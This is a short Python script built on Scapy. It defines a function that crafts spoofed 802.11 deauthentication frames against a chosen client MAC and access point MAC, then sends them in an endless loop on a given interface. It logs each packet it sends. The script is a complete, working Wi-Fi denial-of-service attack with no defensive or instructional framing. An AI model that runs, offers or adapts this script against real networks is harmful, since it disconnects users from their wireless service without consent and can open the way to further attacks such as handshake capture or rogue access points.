from scapy.all import *
import sys
import time
import os

def attack(clientmac, wifimac, iface):
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1=clientmac, addr2=wifimac, addr3=wifimac)/Dot11Deauth(reason=7)
    while True:
        sendp(packet, inter=0.1, iface=iface, verbose=0)
        now = time.localtime()
        print("[" + str(now.tm_hour) + ":" + str(now.tm_min) + ":" + str(now.tm_sec) + "]" + " Deauth packet sent!")
